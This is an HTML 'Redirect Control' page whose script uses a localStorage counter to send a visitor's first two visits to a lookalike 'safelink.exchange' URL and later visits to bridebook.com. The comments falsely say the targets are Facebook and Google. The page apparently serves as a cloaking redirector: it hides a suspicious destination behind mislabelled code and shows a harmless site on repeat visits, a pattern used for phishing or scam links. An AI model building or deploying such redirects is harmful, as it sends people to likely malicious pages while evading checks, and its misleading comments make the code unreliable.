<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect Control</title>
    <script>
        // Editable maximum number of redirects to Facebook
        const maxRedirectsToFacebook = 2;

        // Get the current count of redirects from localStorage
        let redirectCount = parseInt(localStorage.getItem('redirectCount')) || 0;

        // Check if the redirect count exceeds the limit
        if (redirectCount < maxRedirectsToFacebook) {
            // Increment and store the new count
            redirectCount++;
            localStorage.setItem('redirectCount', redirectCount);

            // Redirect to Facebook
            window.location.href = "https://m1-20a-o0safellink.exchange/90298365256387386538763933";
        } else {
            // Redirect to Google after the limit is reached
            window.location.href = "https://www.bridebook.com";
        }
    </script>
</head>
<body>
    <h1>Redirect Control</h1>
    <p id="message">Redirecting...</p>
    <p>To change the redirect limit, edit the `maxRedirectsToFacebook` value in this HTML file.</p>
</body>
</html>
